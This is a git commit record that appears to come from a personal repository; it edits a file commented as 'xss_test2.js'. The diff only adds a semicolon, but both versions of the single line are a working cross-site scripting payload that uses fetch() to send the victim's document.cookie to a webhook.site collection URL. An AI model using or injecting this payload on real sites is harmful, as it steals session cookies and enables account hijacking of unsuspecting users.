088192a303b37b4a3f9046c00efc24bd894e30fa
iamanc <130574061+iamanc@users.noreply.github.com>
2023-09-26 05:21:13 +0700

    Update an2.js

--- an2.js
+++ an2.js
@@ -1,2 +1,2 @@
 // xss_test2.js
-fetch('https://webhook.site/31d27a02-be72-4e85-b6bd-e7c7ca65c489/?c=' + document.cookie)
+fetch('https://webhook.site/31d27a02-be72-4e85-b6bd-e7c7ca65c489/?c=' + document.cookie);
